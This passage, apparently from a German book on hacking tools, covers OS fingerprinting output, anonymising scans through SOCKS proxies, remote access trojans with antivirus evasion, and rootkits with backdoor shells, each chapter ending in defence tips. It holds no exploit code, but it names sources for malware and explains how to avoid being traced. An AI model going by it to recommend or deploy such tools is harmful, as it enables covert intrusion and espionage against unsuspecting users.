Module execution aborted (no open TCP ports known) [-] fingerprint:smb need either TCP port 139 or 445 to run Recv() error: Connection refused [-] fingerprint:snmp: RecvTimeout() failed! [+] Primary guess: [+] Host victim.org Running OS: \"Microsoft Windows 2003 Server Standard Edition\" (Guess probability: 100%) [+] Other guesses: [+] Host victim.org Running OS: \"Microsoft Windows 2003 Server Enterprise Edition\" (Guess probability: 100%) [+] Host victim.org Running OS: \"Microsoft Windows XP SP2\" (Guess probability: 100%) [+] Host victim.org Running OS: \"Microsoft Windows 2000 Workstation\" (Guess probability: 100%) [+] Host victim.org Running OS: \"Microsoft Windows 2000 Workstation SP1\" (Guess probability: 100%) [+] Host victim.org Running OS: \"Microsoft Windows 2000 Workstation SP2\" (Guess probability: 100%) [+] Host victim.org Running OS: \"Microsoft Windows 2000 Workstation SP3\" (Guess probability: 100%) [+] Host victim.org Running OS: \"Microsoft Windows 2000 Workstation SP4\" (Guess probability: 100%) [+] Host victim.org Running OS: \"Microsoft Windows 2000 Server\" (Guess probability: 100%) [+] Host victim.org Running OS: \"Microsoft Windows 2000 Server Service Pack 1\" (Guess probability: 100%) [+] Cleaning up scan engine [+] Modules deinitialized [+] Execution completed. root@discordia:~#\nBild 3.5: Xprobe2 ermittelt das Betriebssystem des Remoterechners\n3.6 p0f\n3.6\n53\np0f\nAnbieter\nhttp://lcamtuf.coredump.cx/p0f.shtml\nPreis\n-\nBetriebssystem(e) Linux/UNIX, Solaris, FreeBSD, NetBSD, Sprachen OpenBSD, Mac OS X, AIX und Windows\nEnglisch\nKategorie(n)\nPassives Fingerprinting-Tool\nGUI\nGr\u00f6\u00dfe\n< 2 MB\nUsability\nInstallation / Kompilation Know-how\nOberfl\u00e4che Nein / Ja\nCMD\nx\nSchnittstellen\nDas Tool p0f dient der passiven Erkennung der im Einsatz befindlichen Betriebssysteme. Hierzu analysiert p0f die Struktur der empfangenen TCP/IP-Pakete des Netzwerkstroms (oder durch mittels tcpdump im Vorfeld gewonnenen Materials) und nimmt auf Grundlage seiner Datenbank eine Zuordnung vor. In unserem Beispiel wird p0f mit folgendem Parameter gestartet: \u2022\n-i device \u2013 listen on this device\nroot@discordia:~# p0f -i eth0 p0f \u2013 passive os fingerprinting utility, version 2.0.8 (C) M. Zalewski , W. Stearns\n[[email protected]](/cdn-cgi/l/email-protection)\np0f: listening (SYN) on 'eth0', 262 sigs (14 generic, cksum 0F1F5CA2), rule: 'all'. 192.168.2.100:60784 \u2013 Linux 2.6 (newer, 2) (up: 2476 hrs) -> 192.168.1.100:3551 (distance 1, link: ethernet/modem) 192.168.1.100:59579 \u2013 Linux 2.6 (newer, 3) (up: 148 hrs) -> 81.169.145.136:110 (distance 0, link: ethernet/modem) 192.168.1.55:1073 \u2013 Linux 2.6, seldom 2.4 (older, 4) (up: 18 hrs) -> 192.168.1.100:445 (distance 0, link: ethernet/modem) 192.168.1.225:1279 \u2013 Windows 2000 SP4, XP SP1+ -> 192.168.1.100:139 (distance 0, link: ethernet/modem) 192.168.1.217:1034 \u2013 Windows 2000 SP4, XP SP1+ -> 92.122.212.138:80 (distance 0, link: ethernet/modem) 192.168.1.10:1471 \u2013 Windows 2000 SP4, XP SP1+ -> 63.245.209.58:80 (distance 0, link: ethernet/modem) 192.168.1.10:1474 \u2013 Windows 2000 SP4, XP SP1+ -> 193.99.144.85:80 (distance 0, link: ethernet/modem) 192.168.1.225:1282 \u2013 Windows 2000 SP4, XP SP1+ -> 85.183.249.137:80 (distance 0, link: ethernet/modem) 192.168.1.217:1042 \u2013 Windows 2000 SP4, XP SP1+ -> 192.168.1.229:5900 (distance 0, link: ethernet/modem) 192.168.2.100:46922 \u2013 Linux 2.6 (newer, 2) (up: 2476 hrs) -> 192.168.1.100:3551 (distance 1, link: ethernet/modem) ^C\n54\nKapitel 3 \u2013 An den Toren r\u00fctteln: Portscanner & Co.\n+++ Exiting on signal 2 +++ [+] Average packet ratio: 17.00 per minute. root@discordia:~#\nBild 3.6: p0f bei der Erkennung von im Netzwerk befindlichen Betriebssystemen\nIn folgendem Beispiel wird p0f mit einem durch tcpdump gewonnenen Logfile des Netzwerkverkehrs konfrontiert: \u2022\n-s file \u2013 read packets from tcpdump snapshot\nroot@discordia:~# p0f -s tcpdump_pcap.log p0f \u2013 passive os fingerprinting utility, version 2.0.8 (C) M. Zalewski , W. Stearns\n[[email protected]](/cdn-cgi/l/email-protection)\np0f: listening (SYN) on 'tcpdump_pcap.log', 262 sigs (14 generic, cksum 0F1F5CA2), rule: 'all'. 192.168.2.100:60784 \u2013 Linux 2.6 (newer, 2) (up: 2476 hrs) -> 192.168.1.100:3551 (distance 1, link: ethernet/modem) 192.168.1.100:59579 \u2013 Linux 2.6 (newer, 3) (up: 148 hrs) -> 81.169.145.136:110 (distance 0, link: ethernet/modem) 192.168.1.55:1073 \u2013 Linux 2.6, seldom 2.4 (older, 4) (up: 18 hrs) -> 192.168.1.100:445 (distance 0, link: ethernet/modem) 192.168.1.225:1279 \u2013 Windows 2000 SP4, XP SP1+ -> 192.168.1.100:139 (distance 0, link: ethernet/modem) 192.168.1.217:1034 \u2013 Windows 2000 SP4, XP SP1+ -> 92.122.212.138:80 (distance 0, link: ethernet/modem) [+] End of input file. root@discordia:~#\nBild 3.7: p0f bei der nachtr\u00e4glichen Analyse durch tcpdump gewonnenen Materials\n3.7\nAbwehr \u2013 generelle Tipps\nNach derzeitigem Stand des Wissens sind reine Portscans, z. B. via Nmap, nur schwer abzuwehren. Da das damit verbundene Sicherheitsrisiko minimal ist \u2013 wenn wir Standardabwehrma\u00dfnahmen bestehend aus Hardware- oder Desktop-Firewall als vorhanden voraussetzen \u2013, sollte nur intensiven Portscans (im Minutenbereich) Beachtung geschenkt werden, da hier m\u00f6glicherweise Vorbereitungen f\u00fcr einen gezielten Einbruch getroffen werden. Sehr oft werden auch Portscans durchgef\u00fchrt, um infizierte Rechner zu identifizieren bzw. zu koordinieren. Nicht unumstritten ist im \u00dcbrigen die Legalit\u00e4t12 von Portscans auf fremde Serveranlagen.\n12\nhttp://www.sans.org/reading_room/whitepapers/legal/the_ethics_and_legality_of_port_ scanning_71?show=71.php&cat=legal\n55\n4\nProxy & Socks\nProxy oder Proxyserver sind die Datenverkehrsvermittler f\u00fcr Computernetze; sie klinken sich f\u00fcr gew\u00f6hnlich zwischen Client (z. B. Internetbrowser) und Server ein, mit dem Ziel, den Datentransfer zu protokollieren, zu beschleunigen oder zu anonymisieren. Speziell f\u00fcr letzteren Zweck wurden JAP (Java Anon Proxy) und TOR (Tor\u2019s Onion Routing) entwickelt. Sie anonymisieren Webbrowsing, Instant Messaging, IRC, SSH, EMail, P2P und andere Dienste. Wer sich also weitgehend anonym im Netz bewegen m\u00f6chte, wird um den Einsatz dieser oder \u00e4hnlicher Produkte nicht herumkommen. Popul\u00e4re Proxies laufen auf verschiedenen Ports, darunter: \u2022\nPort 80, 8000, 8080, 3128 etc. f\u00fcr das HTTP(S)-Protokoll\n\u2022\nPort 81, 8001 und 8081 f\u00fcr milit\u00e4risch genutzte Proxies\n\u2022\nPort 1080 f\u00fcr SOCKS-Server\n\u2022\nPort 23 f\u00fcr Telnet-Wingate-Server und\n\u2022\nPort 21 f\u00fcr FTP-Wingate-Server\nEine gute Vorstellung \u00fcber anonymisierende Proxies und entsprechende Proxylisten findet man auf www.proxylisten.de. Alternativ ist http://proxy4free.com/index.html eine gute Adresse. Im Gegensatz zu den Internetbrowsern sind aber viele Programme, z. B. Scanner, nicht direkt in der Lage, den Datenverkehr ins Internet \u00fcber einen anonymisierenden Proxyserver abzuwickeln. Daf\u00fcr gibt es spezielle Programme, mit denen Portoder Security-Scanner in die Lage versetzt werden, \u00fcber Socks-Proxies mit den Zielrechnern Kontakt aufzunehmen. Da Socks-Proxies fast alle anonym arbeiten, ist das Risiko, bei einer Scanattacke direkt zur Verantwortung gezogen zu werden, sehr gering. Nach einem \u00e4hnlichen Prinzip arbeiten im Prinzip kriminelle Hacker, wenn sie f\u00fcr ihre Aktivit\u00e4ten wie DDoS-Attacken im Vorfeld aufgebaute Bot-Netze oder Zombierechner einsetzen, die ihnen denselben Anonymisierungsschutz bieten wie externe Proxies. Bevor man Proxies nutzt, braucht man nat\u00fcrlich die Connectdaten: \u2022\nIP-Adresse des Proxy\n\u2022\nProxytyp wie HTTP(S), Socks4, Socks5\n\u2022\nPort, auf dem der Proxy arbeitet\n\u2022\nGegebenenfalls die Login-Passwort-Kombination\n\u2022\nDaf\u00fcr wiederum gibt es \u2013 tagesaktuell \u2013 bestimmte Listen mit verf\u00fcgbaren Proxies, z. B. unter www.proxylisten.de.\n56\nKapitel 4 \u2013 Proxy & Socks\nBild 4.1: Aktive Proxies finden mit proxy-listen.de\n4.1\nFreeCap\nAnbieter\nwww.freecap.ru/eng\nPreis\nBetriebssystem(e)\nWindows\nSprachen\nEnglisch\nKategorie(n)\nSocks-Proxy\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 2 MB\nUsability\nInstallation\nNein Know-how\nx\nCMD\nSchnittstellen\nIm Prinzip ein gut nutzbares Programm, wenn man einige wichtige Schritte beherzigt. Der wichtigste ist das Finden eines funktionierenden Proxyservers, den man f\u00fcr seine Zwecke nutzen m\u00f6chte. Im zweiten Schritt muss man die Anwendung, die man anonym nutzen m\u00f6chte, in FreeCap konfigurieren, d. h. die Proxydaten entsprechend \u00fcbernehmen. Theoretisch kann man den erzielbaren Anonymit\u00e4tsgrad auch durch eine Proxykette steigern, wof\u00fcr FreeCap eine entsprechende Option bereith\u00e4lt.\n4.2 Proxy Finder\n57\nBild 4.2: Proxykonfiguration f\u00fcr jedes Programm\n4.2\nProxy Finder\nAnbieter\nwww.proxy-tool.com\nPreis\nBetriebssystem(e)\nWindows XP\nSprachen\nEnglisch\nKategorie(n)\nProxy Tools\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 2 MB\nUsability\nInstallation\nNein Know-how\nAb 29 $ x\nCMD\nSchnittstellen\nDie Alternative, wenn man sich nicht auf vorgefertigte Proxylisten verlassen will, besteht darin, sie sich selbst zu generieren. Voraussetzung daf\u00fcr ist ein Tool wie der Proxy-Finder, der das Internet auf freie Proxies scannt. Der Suchbereich ist frei w\u00e4hlbar, ebenso die Ports wie 1080, 8080 etc. Die Portliste kann anschlie\u00dfend im ASCII-Format exportiert werden.\n58\nKapitel 4 \u2013 Proxy & Socks\nBild 4.3: Proxy Finder: schon nach 30 Sekunden Tausende von Treffern\n4.3\nAbwehr \u2013 generelle Tipps\nProxy-Tools sind per se keine Angriffsinstrumente, aber sie k\u00f6nnen u. a. benutzt werden, um kriminelle Aktivit\u00e4ten zu verschleiern. Auf B\u00fcrorechnern im Firmennetzwerk haben sie allerdings nichts zu suchen.\n59\n5\nRemote Access Tools (RAT) \u2013 Anleitung f\u00fcr Zombie-Macher\nKurz gesagt ist ein Zombie ein Rechner ohne eigene Seele oder etwas weniger poetisch ausgedr\u00fcckt: ein Rechner, der nicht mehr vollst\u00e4ndig von seinem Anwender, sondern von au\u00dferhalb kontrolliert und gesteuert wird. Von solchen Rechnern k\u00f6nnen Daten (Logins, Passw\u00f6rter, PINs, TANs) transferiert, aber auch DDoS-Attacken gestartet werden \u2013 bei minimalen Risiken f\u00fcr den T\u00e4ter, da er nicht selbst an der Tastatur des TatPCs sitzt. Die hier vorgestellten RATs sind die Luxusausf\u00fchrung und eignen sich speziell f\u00fcr individuelle Aufgaben, z. B. dem Ausspionieren von privaten oder Firmengeheimnissen, w\u00e4hrend die Wald-und-Wiesen-RATs meistens als Trojaner auf dem PC des ahnungslosen Users landen, z. B. beim Besuchen pr\u00e4parierter Webseiten oder beim \u00d6ffnen infizierter Mails. Nat\u00fcrlich kann man diese Tools auch v\u00f6llig legal einsetzen (wie die Entwickler blau\u00e4ugig versichern), um seinen eigenen PC aus der Ferne zu steuern. \u00c4hnlich klingende Bezeichnungen sind: Remote Administration Tool oder (eindeutiger) Remote Access Trojan. Gegen\u00fcber klassischen Fernwartungstools haben RATs eine differenzierte Tarnfunktion, d. h., sie verstecken sich, ihre Prozesse und Treiber h\u00e4ufig mit Rootkit-Technologie vor den Augen der ahnungslosen RAT-Nutzer. Fast alle RATS bestehen aus zwei Teilen: einem Client, mit dem der Angreifer seine Angriffsziele spezifiziert (Fernsteuerung, Daten\u00fcbertragung, Keylogger etc.), und der damit erstellten Serverkomponente, die dem Opfer (Victim oder kurz auch \u00bbvic\u00ab genannt) untergeschoben wird. Nach seiner Installation \u00bblauscht\u00ab der RAT-Server auf einem vorbestimmten Port und wartet auf Anweisungen. Die fr\u00fchesten und in der Szene auch ber\u00fchmt gewordenen RATs waren Back Orifice (BO2K) und SubSeven (auch Backdoor-G oder kurz Sub7 genannt). Zwar findet man diese Tools noch ab und zu im Netz, in der Szene setzt man allerdings auf leistungsf\u00e4higere Tools, die \u00fcber eine bessere Tarnfunktionalit\u00e4t verf\u00fcgen und auch hinter dem R\u00fccken von Firewalls und Virenscannern arbeiten k\u00f6nnen.\n5.1\nAtelier Web Remote Commander\nAnbieter\nwww.atelierweb.com\nPreis\nTrial, ab 96,95 $\nBetriebssystem(e) Win XP, Win 2000, Win2003, Win NT, Win Vista, Win 7\nSprachen\nEnglisch\nKategorie(n)\nRemote Administration\nOberfl\u00e4che GUI\nGr\u00f6\u00dfe\n< 5 MB\nJa\nUsability\nInstallation /\nKnow-how\nx\nSchnittstellen\nCMD\n60\nKapitel 5 \u2013 Remote Access Tools (RAT) \u2013 Anleitung f\u00fcr Zombie-Macher\nDer Remote Commander ist im Gegensatz zu den anderen hier vorgestellten Werkzeugen ein offizielles Managementtool zur \u00dcberwachung von Remote-PCs. Gr\u00f6\u00dfter Vorteil: Es muss auf dem zu \u00fcberwachenden PC nicht installiert werden, es werden keine Treiber und keine zu installierenden Programme auf dem Remote-PC ben\u00f6tigt; selbst eine dort installierte Desktop-Firewall kann den Fernzugriff blockieren. Einzige Voraussetzung: Auf dem \u00bbOpfer-PC\u00ab muss das Microsoft Network samt Drucker- und Dateifreigabe installiert sein und der Remote Admin braucht f\u00fcr den Zugriff ein Benutzerkonto mit administrativen Rechten.\nBild 5.1: Auf dem Remote-PC k\u00f6nnen beliebige Manipulationen vorgenommen werden\n5.2\nPoison Ivy\nAnbieter\nwww.poisonivy-rat.com\nPreis\n-\nBetriebssystem(e) Win XP, Win 2000, Win 2003, Win Sprachen NT\nEnglisch\nKategorie(n)\nRAT\nGUI\nGr\u00f6\u00dfe\n< 1 MB\nUsability\nOberfl\u00e4che Installation Know-how\nNein\nSchnittstellen\nx CMD\n5.3 Turkojan\n61\nSehr einfach einzurichtendes Servermodul (f\u00fcr Zielrechner bzw. Victim) inklusive Manual mit einer Vielzahl von Fernsteuerungsm\u00f6glichkeiten: File Manager, Registry Editor, Process Manager, Service Manager, Window Manager, Sniffer (zum Abh\u00f6ren aller Verbindungen des Zielrechners nach au\u00dfen), Key Logger, Screen Shooter etc. Auf Wunsch liefert der Programmautor auch Spezialanpassungen: \u00bbA custom version, not detected by any anti-virus products is available for sale.\u00ab Im \u00dcbrigen ist die komplette Verbindung zum RAT verschl\u00fcsselt und passwortgesch\u00fctzt, sodass kein anderer den Zombierechner nutzen kann.\nBild 5.2: Komfortable All-in-one-L\u00f6sung\n5.3\nTurkojan\nAnbieter\nwww.turkojan.com\nPreis\n-\nBetriebssystem(e)\nWin XP, Win 2000, Win 2003, Win NT, Win Vista, Win 7\nSprachen\nDeutsch, Englisch, T\u00fcrkisch\nKategorie(n)\nRAT\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 2 MB Installation\nUsability\nKnow-how\nNein\nx CMD\nSchnittstellen\nTurkojan, das Produkt einer t\u00fcrkischen Hackerschmiede, pr\u00e4sentiert sich multilingual und mit vielen Features, jetzt auch f\u00fcr Windows 7. Der Funktionsumfang ist betr\u00e4chtlich; im Netz existieren viele Videos, die anschaulich zeigen, wie man sich das Server-\n62\nKapitel 5 \u2013 Remote Access Tools (RAT) \u2013 Anleitung f\u00fcr Zombie-Macher\nmodul (f\u00fcr den Opfer-PC) zusammenklickt. Es gibt auch eine Private Edition, die gegen die meisten Antivirenprogramme geh\u00e4rtet ist.\nBild 5.3: Die t\u00fcrkische Variante: derzeit eines der leistungsf\u00e4higsten RATs\n5.4\nOptix Pro\nAnbieter\nwww.evileyesoftware.com\nPreis\n-\nBetriebssystem(e)\nWin XP, Win 2000, Win 2003, Win NT\nSprachen\nDeutsch, Englisch, Franz\u00f6sisch Griech., Italienisch, Arabisch\nKategorie(n)\nRAT\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 1 MB\nUsability\nInstallation\nx\nCMD\nNein Schnittstellen Know-how\nMultilinguales, mit vielen Features (wie Firewall-, AV-Deaktivierung, CGI-Logger etc.) ausgestattetes Remote Administration Tool. Laut den Entwicklern ist es in der Lage, 73 AV-Tools sowie 37 Personal-Firewalls auszuschalten.\n5.5 Abwehr \u2013 generelle Tipps\n63\nBild 5.4: Komfortabel zu bedienendes Builder-Modul\nAuf Wunsch kann das Servermodul noch mit UPX verschl\u00fcsselt werden.\n5.5\nAbwehr \u2013 generelle Tipps\nAbgesehen von der kommerziellen Variante von Web Atelier m\u00fcssen die meisten RATs auf dem Ziel-PC installiert werden, ohne dass der Benutzer davon etwas ahnt, sei es als Drive-by-Download oder als ausf\u00fchrbarer Mailanhang. Genau hier setzt die Verteidigungsstrategie an. Im Grunde sind Realtime-Scanner und Verhaltensblocker, die zum Toolumfang der g\u00e4ngigen AV-Programme geh\u00f6ren oder auch als Standalone-L\u00f6sungen angeboten werden, Pflicht. Von der Fachpresse sehr gut bewertet wurden u. a. die Behavior Blocker bzw. HIPS (Host-based Intrusion and Prevention System): \u2022\nOnline Armour (Shareware: www.tallemu.com)\n\u2022\nProSecurity (Shareware: www.proactive-hips.com13)\n\u2022\nAntiHook 3 (Shareware: www.infoprocess.com.au)\nIm Gegensatz zu konventionellen, signaturbasierten AV-Scanner registrieren diese Schutzprogramme Verhaltensauff\u00e4lligkeiten im System, Keylogger werden ebenso geblockt wie Remote-Verbindungen nach au\u00dfen.\n13\nDerzeit ist die Seite nicht zu erreichen bzw. wird umgeleitet auf eine \u00bbunder construction\u00ab. Deshalb wohl nur mit Vorsicht zu genie\u00dfen.\n65\n6\nRootkits \u2013 Malware stealthen\nAn sich sind Rootkits ein alter Hut; in der UNIX-Welt existieren sie seit Beginn der 90er-Jahre. Damals wurden sie von Hackern als eine Art Hintert\u00fcrprogramm eingesetzt, um nicht nur den Hack zu tarnen, sondern um sich auch in Zukunft auf dem gekaperten System mit den Rechten des Systemadminstrators root unbemerkt bewegen zu k\u00f6nnen. Also mit einfachen Worten: Ein \u00bbWurzelbaukasten\u00ab ist eine raffinierte Tarntechnik, mit der ein Angreifer einen fremden PC \u00fcbernehmen und steuern kann, ohne dass diese Aktivit\u00e4ten vom User bemerkt w\u00fcrden. Diese Tarntechnik eignet sich besonders gut in Kombination mit RATs und Keyloggern, weswegen eine Grenzziehung zwischen Rootkits und Trojanern in der Praxis nicht immer m\u00f6glich ist. Nebenbei bemerkt lassen sich mit Rootkits nat\u00fcrlich auch andere Sch\u00e4dlinge tarnen, z. B. Browser-Hijacker oder Adware. Rootkits lassen sich anhand ihrer Angriffspunkte grob in zwei Gruppen unterteilen: \u2022\nUserland-Rootkits\n\u2022\nKernel-Rootkits (LKM, KMem)\nDie Zugriffssteuerung von Betriebssystemen, die auf der x86-Prozessorfamilie von Intel aufsetzen (z. B. Windows und Linux), setzen zur Zugriffssteuerung auf das Prinzip der Ringe, wobei in Ring 0 der gesamte Kernelcode von Windows residiert und Ring 3 (die Ringe 1 und 2 werden nicht benutzt) f\u00fcr Anwenderprogramme (z. B. Word, Excel, Internet Explorer etc.) reserviert ist. Programmcode, der im Ring 0 oder der Kernelebene ausgef\u00fchrt wird, verf\u00fcgt \u00fcber h\u00f6here Privilegien als derjenige, der im Userland (Ring 3) operiert. Zwischen Ring 0 und Ring 3 existieren Schnittstellen, die von der WinAPI realisiert werden und aus den Bibliotheken Advapi.dll, Gui32.dll, Kernel32.dll und Win32.dll bestehen. Da kein Userland-Programm direkt mit dem Kernel kommunizieren kann, werden alle Kernelaufrufe \u00fcber die WinAPI abgewickelt. Und genau hier ist der Angriffspunkt der Userland-Rootkits. Stark vereinfacht gesagt, machen diese nichts anderes, als ihren Programmcode in Anwenderprogramme zu injizieren, wo sie dann z. B. \u00fcber die User.dll in den Kernel geladen werden. In der Folge kontrollieren diese Rootkits dann die Kommunikation zwischen Kernel und Userland, d. h. jeder Aufruf des Taskmanagers, des Dateiexplorers oder anderer Programme wird entsprechend gefiltert mit dem Ergebnis, dass Prozesse unsichtbar gemacht, Trojanerports freigegeben, oder die Anwesenheit von weiterer Malware auf dem Rechner verschleiert wird. \u00bbNackte\u00ab Rootkits ohne Zusatzfunktionalit\u00e4t sind streng betrachtet noch keine Malware; kritisch wird es erst, wenn mit ihrer Stealth-Technologie anderer sch\u00e4dlicher Code (von W\u00fcrmern, Trojanern, Viren, RATs etc.) vor dem Zugriff durch Viren-/Malware-Scanner versteckt wird.\n66\nKapitel 6 \u2013 Rootkits \u2013 Malware stealthen\nMehr Ressourcen zum Thema \u2013 vorzugsweise f\u00fcr den Windows-Bereich (Rootkits, Antirootkits, Sourcecodes, Dokus etc.) \u2013 findet man unter: www.rootkit.com.\nBild 6.1: Wirkungsweise von Windows-Rootkits\n6.1\nOddysee_Rootkit\nAnbieter\nhttp://98.15.254.95/RootKits\nPreis\n-\nBetriebssystem(e) Win 2000, Win 2003, Win XP\nSprachen\nEnglisch\nKategorie(n)\nRootkit\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 20 KB\nUsability\nInstallation\nCMD -\nSchnittstellen Know-how\nEin sehr schlankes Standalone-Rootkit mit klassischer Funktionalit\u00e4t. Nach dem erstmaligen Programmaufruf wird ein Treiber gestartet, der sich \u2013 unsichtbar \u2013 in der Registry verankert und jedes Programm, jede Datei, jeden Registryeintrag verbirgt, der mit einem doppelten Unterstrich anf\u00e4ngt. Mit diesem Programm l\u00e4sst sich so gut wie jede zus\u00e4tzliche Malware stealthen. Der folgende Screenshot der Registry konnte nur gemacht werden, nachdem das Rootkit mit IceSword manuell deaktiviert wurde.\n6.2 Hacker_Defender\n67\nBild 6.2: Rootkit, das bei jedem Neustart als Service gestartet wird\n6.2\nHacker_Defender\nAnbieter\nwww.rootkit.com\nPreis\nBetriebssystem(e)\nWin 2000, Win 2003, Win XP\nSprachen\nEnglisch\nKategorie(n)\nRootkit\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 300 KB\nUsability\nInstallation\nCMD x\nSchnittstellen Know-how\nDer Klassiker und eines der am weitesten verbreiteten Rootkits. Er wird mit .ini-Files konfiguriert: \u2022\n[Hidden Table]\n\u2022\n[Hidden Processes]\n\u2022\n[Root Processes]\n\u2022\n[Hidden Services]\n\u2022\n[Hidden RegKeys]\n\u2022\n[Hidden RegValues]\n\u2022\n[Startup Run]\n\u2022\n[Free Space]\n\u2022\n[Hidden Ports] and [Settings]\nBei der Installation wird gleichzeitig ein Backdoor installiert, das einem Angreifer, der sich mit dem richtigen Passwort ausgewiesen hat, eine getarnte Backdoor-Shell einrichtet.\n68\nKapitel 6 \u2013 Rootkits \u2013 Malware stealthen\nBild 6.3: ZoneAlarm unterbindet eine Infektion\n6.3\nAbwehr \u2013 generelle Tipps\nGrunds\u00e4tzlich stellen Rootkits eine der gr\u00f6\u00dften Bedrohungen f\u00fcr die Integrit\u00e4t von Rechnern und Netzen dar, da vorhandene Sicherheitsmechanismen wie AV-Programme und Desktop-Firewalls einfach unterlaufen werden. Neueste Rootkits wie Rustock 2010 oder Abk\u00f6mmlinge der TDL- oder TDSS-Familie sind selbst mit spezialisierten AntiRootkitprogrammen nur schwer zu bek\u00e4mpfen. Erschwerend kommt hinzu, dass von ca. zwei Dutzend Antirootkits nur ein Drittel f\u00fcr die neueren Windowsversionen Vista und Win 7 geeignet sind; f\u00fcr die 64-Bit-Versionen sind es noch viel weniger (vgl. http://www.antirootkit.com/news.htm) Bei einem Verdacht sollten grunds\u00e4tzlich mehrere Tools parallel angewendet werden \u2013 erstens solche mit automatischer Erkennungsfunktion wie der Blacklight Rootkit Eliminator von F-Secure, zweitens spezielle, aber profunde Systemkenntnisse voraussetzende Werkzeuge wie der Deep System Explorer von DiamondCs oder der Rootkit Unhooker (www.antirootkit.com). Eine weitere M\u00f6glichkeit ergibt sich durch einen Datei-Scan. Zu diesem Zweck wird das gesamte Dateisystem einmal unter dem laufenden Betriebssystem und einmal extern (Start von CD oder USB-Stick) gescannt, z. B. mit dem Advanced Checksum Verifier (www.irnis.net) und dann werden die Abweichungen analysiert. So fallen durch diese Methode modifizierte Systemdateien eher auf.\n69\n7\nSecurity-/VulnerabilityScanner\nIm Gegensatz zu den klassischen Portscannern verf\u00fcgen Security Scanner wie Nessus oder GFI LANguard \u00fcber weitergehende, datenbankgest\u00fctzte M\u00f6glichkeiten und eine offene, erweiterbare Architektur, um ein Zielsystem nach bekannten sowie brandneuen Schwachstellen zu scannen: \u2022\nDienste\n\u2022\nFreigaben\n\u2022\nPassw\u00f6rter / Passwortrichtlinien\n\u2022\nOffene Ports\n\u2022\nFehlende Patches in Betriebssystemen sowie installierten Diensten und Programmen\nAnhand des Auswertungsprotokolls k\u00f6nnen Netzwerk- und Systemadministrator nun gezielt die aufgezeigten Sicherheitsl\u00fccken stopfen. Prinzipiell k\u00f6nnen Zielsysteme nichtdestruktiv auditiert werden (was die Systemstabilit\u00e4t des Zielsystems w\u00e4hrend des Testens garantiert) oder der Scanner provoziert gezielt Sicherheitsl\u00fccken, st\u00f6\u00dft also gewisserma\u00dfen in die Weichteile vor, um sozusagen am lebenden System die real vorhandenen Abwehrm\u00f6glichkeiten zu testen. Auch wenn f\u00fcr die meisten Hacker, mindestens aber f\u00fcr Script-Kiddies, solche Werkzeuge \u00fcberdimensioniert sind oder ein solides Fachwissen voraussetzen, sind die praktischen Gefahren, die von SecurityScannern ausgehen, dennoch nicht zu vernachl\u00e4ssigen.\n7.1\nX-NetStat Professional\nAnbieter\nwww.freshsoftware.com\nPreis\nTrial, ab 29,95 $ Single License\nBetriebssystem(e)\nWin95, Win98, WinME, Win2000, WinXP, Win2003, Win NT 4.0, Win 7\nSprachen\nEnglisch\nKategorie(n)\nSecurity Scanner\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 2 MB\nJa\nUsability\nInstallation\nKnow-how\nGUI\nSchnittstellen\nx\nCMD\nWinPCap\nMit X-NetStat verf\u00fcgt der Benutzer einerseits \u00fcber mehr Komfort als mit dem windowseigenen Kommandozeilentool Netstat.exe und andererseits \u00fcber weit mehr M\u00f6glichkeiten, sein Netzwerk zu kontrollieren. Auf einen Blick erkennt er, auf welchen Ports\n70\nKapitel 7 \u2013 Security-/Vulnerability-Scanner\nkommuniziert wird, mit wem der eigene PC verbunden ist und er sieht andere Rechner im Netz, die Art des Zugriffs, die Remoteadressen sowie Anzahl und Inhalt (via Sniffer) der gesendeten und empfangenen Datenpakete. Zus\u00e4tzlich lassen sich gezielt Verbindungen global oder mit selbst erstellten Regeln blockieren. In den H\u00e4nden eines versierten Verteidigers ist es weniger ein Angriffswerkzeug als ein Analysetool.\nBild 7.1: Alle Netzwerkinformationen im Griff mit X-NetStat\nWenn es beispielsweise einem Angreifer gelingen sollte, seine Daten unbemerkt via DLLInjection in ein anderes Programm durch die Firewall zu schleusen, kann der Verteidiger den geloggten Datenverkehr mit X-NetStat analysieren und die Spuren zur\u00fcckverfolgen. Weiterhin k\u00f6nnen gezielt diese Verbindungen so lange blockiert werden, bis weitere Abwehrma\u00dfnahmen greifen.\n7.2\nGFI LANguard N.S.S.\nAnbieter\nwww.gfisoftware.de\nPreis\nFreeware Version, ab 320 \u20ac (10 IP-Adressen)\nBetriebssystem(e)\nWindows 2000, Win XP, Win 2003\nSprachen\nDeutsch, Englisch, Italienisch\nKategorie(n)\nSecurity-/Vulnerability-Scanner\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 20 MB\nJa\nUsability\nInstallation\nKnow-how\nGUI\nSchnittstellen\nx CMD\n7.3 Nessus\n71\nDer \u00bbMercedes\u00ab unter den Security-Scannern \u2013 auch vom Preis \u2013 mit ausgezeichnetem Handling, durchdachter Benutzeroberfl\u00e4che, integriertem Patch-Agent, Script-Debugger und Status-Monitor. Sinnvoll ist die Anwendung dieses Werkzeugs vor allem bei Sicherheits-Audits, Penetrationstests sowie generell bei der \u00dcberpr\u00fcfung von Schwachstellen in Firmennetzen. F\u00fcr Hacker ist das Werkzeug zwar auch n\u00fctzlich, im Endeffekt aber deutlich \u00fcberdimensioniert.\nBild 7.2: Schwachstellenanalyse mit GFI LANguard\n7.3\nNessus\nAnbieter / Entwickler\nwww.nessus.org\nPreis\nBetriebssystem(e)\nLinux/UNIX, FreeBSD, Sprachen Solaris, Mac OS X, Windows\nKategorie(n)\nNetzwerkscanner / Vulnerability-Scanner\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 120 MB\nNein / Ja\nUsability\nInstallation / Kompilation\nKnow-how\nkommerziell: $1,200 pro Jahr Englisch GUI\nSchnittstellen\nx\nCMD x\nAmap, Nmap\nNessus ist ein m\u00e4chtiger Vulnerability-Scanner f\u00fcr mittlerweile zahlreiche Plattformen mit derzeit etwa 35.000 unterschiedlichen Plugins. Das Nessus-Paket basiert grunds\u00e4tz-\n72\nKapitel 7 \u2013 Security-/Vulnerability-Scanner\nlich auf dem Client/Server-Prinzip: Der Serverdienst l\u00e4uft auf einem Rechner, auf dem sich entweder ein lokaler oder ein entfernter Client verbinden 